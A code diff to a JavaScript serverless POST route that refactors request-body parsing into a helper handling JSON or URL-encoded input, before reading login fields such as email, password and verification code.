@@ -3,20 +3,18 @@ import { getCachedRow, setCachedRow, populateCache } from "../../../../utils/coo
 import { incrementUsage } from "../../../../utils/serverlessTracker.js";
 import { getSheetDataApi } from "../../../api/googlesheets.js";
 
+function parseBody(text) {
+    try { return JSON.parse(text); } catch (e) {}
+    try { return Object.fromEntries(new URLSearchParams(text)); } catch (e) {}
+    return null;
+}
+
 export async function POST(request) {
     incrementUsage();
 
-    let body;
-    try {
-        body = await request.json();
-    } catch (e) {
-        try {
-            const text = await request.text();
-            body = Object.fromEntries(new URLSearchParams(text));
-        } catch (e2) {
-            return corsJson({ success: false, error: "Invalid request body" }, 400);
-        }
-    }
+    const text = await request.text();
+    const body = parseBody(text);
+    if (!body) return corsJson({ success: false, error: "Invalid request body" }, 400);
 
     const { browserId, token, email, password, verificationChoice, verificationCode } = body;
 
